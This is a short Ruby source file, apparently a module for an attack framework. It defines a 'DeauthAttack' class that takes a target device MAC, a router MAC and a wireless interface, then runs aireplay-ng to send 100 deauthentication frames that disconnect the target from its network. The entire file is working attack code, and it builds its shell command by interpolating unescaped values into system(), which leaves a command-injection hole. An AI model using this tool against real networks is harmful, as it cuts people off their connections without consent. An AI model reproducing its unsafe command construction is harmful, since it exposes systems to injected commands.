class DeauthAttack
  attr_accessor :target_mac, :router_mac, :interface

  def initialize
    @target_mac = nil
    @router_mac = nil
    @interface  = "wlan0mon"
  end

  def set(option, value)
    case option.downcase
    when "target_mac"
      @target_mac = value
    when "router_mac"
      @router_mac = value
    when "interface"
      @interface = value
    end
  end

  def detect_os
    RUBY_PLATFORM =~ /linux/
  end

  def run
    return unless detect_os && @target_mac && @router_mac && @interface

    cmd = "aireplay-ng --deauth 100 -a #{@router_mac} -c #{@target_mac} #{@interface}"
    system(cmd)
  rescue => e
    puts e.message
  end
end